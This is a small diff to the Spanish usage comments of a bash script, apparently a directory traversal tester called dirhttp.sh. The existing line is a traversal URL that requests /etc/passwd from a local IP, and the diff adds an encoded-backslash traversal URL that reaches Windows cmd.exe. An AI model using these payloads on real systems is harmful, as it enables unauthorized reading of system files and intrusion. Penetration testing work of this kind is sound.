@@ -5,6 +5,7 @@
 # -vvv Mostrar detalle en el resultado
 #
 # Uso.: ./dirhttp.sh "http://192.168.1.252:80/../../../../../../../etc/passwd"
+# Uso.: ./dirhttp.sh "http://192.168.1.119/%5c../%5c../%5c../%5c../%5c/Windows/%5c/System32/%5c/cmd.exe"
 # 
 #
 #!/bin/bash
